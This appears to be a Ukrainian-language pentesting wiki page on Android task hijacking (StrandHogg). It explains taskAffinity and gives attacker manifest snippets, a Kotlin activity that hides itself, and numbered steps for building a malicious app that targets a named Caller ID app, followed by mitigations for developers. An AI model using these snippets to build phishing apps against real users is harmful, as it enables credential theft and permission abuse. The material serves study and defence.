# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Завдання, стек назад та активності на передньому плані

У Android, **завдання** - це, по суті, набір активностей, з якими користувачі взаємодіють для виконання конкретної роботи, організованих у **стек назад**. Цей стек упорядковує активності на основі того, коли вони були відкриті, причому найновіша активність відображається вгорі як **активність на передньому плані**. У будь-який момент часу лише ця активність видима на екрані, що робить її частиною **завдання на передньому плані**.

Ось швидкий огляд переходів між активностями:

- **Активність 1** починається як єдина активність на передньому плані.
- Запуск **Активності 2** переміщує **Активність 1** у стек назад, виводячи **Активність 2** на передній план.
- Запуск **Активності 3** переміщує **Активність 1** та **Активність 2** далі назад у стеку, з **Активністю 3** тепер попереду.
- Закриття **Активності 3** повертає **Активність 2** на передній план, демонструючи спрощений механізм навігації завдань Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Атаки на афінність завдань

`taskAffinity` вказує Android, до якого завдання `Activity` *бажає* належати. Коли дві активності мають однакову афінність, **Android дозволяє об'єднувати їх у одному стеку назад, навіть якщо вони походять з різних APK**.

Якщо зловмисник може розмістити шкідливу активність на **корені** цього стеку, щоразу, коли жертва відкриває легітимний додаток, шкідливий інтерфейс буде першим, що бачить користувач – ідеально для фішингу або зловживання дозволами.

Поверхня атаки ширша, ніж багато розробників вважають, оскільки **кожна активність автоматично успадковує афінність, рівну назві пакета програми** (якщо розробник не встановить `android:taskAffinity=""`). Тому *нічого не роблячи* вже залишає додаток відкритим для захоплення завдань на версіях Android до 11.

### Класичний сценарій "singleTask / StrandHogg"

1. Зловмисник оголошує активність з:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. Шкідливий додаток запускається один раз, щоб завдання (з підробленою афінністю) існувало в останніх завданнях.
3. Коли користувач пізніше відкриває реальний додаток, Android виявляє, що вже існує завдання, афінність якого **відповідає пакету**, і просто виводить це завдання на передній план.
4. Інтерфейс зловмисника показується першим.

### Варіант за замовчуванням – Caller ID кейс

Вразливість, виявлена в додатку **Caller ID (caller.id.phone.number.block)**, показує, що атака *також* працює проти стандартного режиму запуску `standard`:

1. Зловмисний додаток створює підроблену кореневу активність і відразу ж ховається:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // зберегти завдання в останніх, але поза полем зору
}
}
```
2. У маніфесті потрібно лише скопіювати пакет жертви в `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Як тільки користувач встановлює і відкриває шкідливий додаток **один раз**, завдання, афінність якого дорівнює пакету жертви, існує (але знаходиться на фоні).
4. Коли запускається реальний додаток Caller ID, Android повторно використовує це завдання і виводить `HackActivity` на передній план → вікно фішингу/зловживання дозволами.

> ПРИМІТКА: Починаючи з **Android 11 (API 30)**, система *не* поміщає два пакети, які не є частиною одного UID, в одне завдання за замовчуванням, що пом'якшує цю конкретну варіацію. Старі версії залишаються вразливими.

---

## Перевірка та експлуатація

1. Витягніть `AndroidManifest.xml` з цільового APK і перевірте, що кожна `<activity>` (або глобальний елемент `<application>`) містить `android:taskAffinity=""` (порожній) **або** налаштоване значення.
2. Якщо ні, створіть шкідливий додаток:
- `android:taskAffinity` = назва пакета жертви.
- Надати намір `MAIN/LAUNCHER`, щоб користувач міг відкрити його один раз.
- За бажанням викликати `moveTaskToBack(true)`, щоб відразу сховати.
3. Дайте жертві відкрити їх легітимний додаток → захоплення.

## Пом'якшення

Розробники повинні:

* Явно встановити `android:taskAffinity=""` на рівні `<application>` (рекомендується) **або** надати кожній активності унікальну, приватну афінність.
* Для дуже чутливих екранів поєднувати вищезазначене з `android:launchMode="singleInstance"` або сучасними [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) захистами.
* Оновити `targetSdkVersion` додатка та впровадити зміни поведінки **Android 11**, де завдання за замовчуванням не діляться між пакетами.

---

## Посилання

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)

{{#include ../../banners/hacktricks-training.md}}
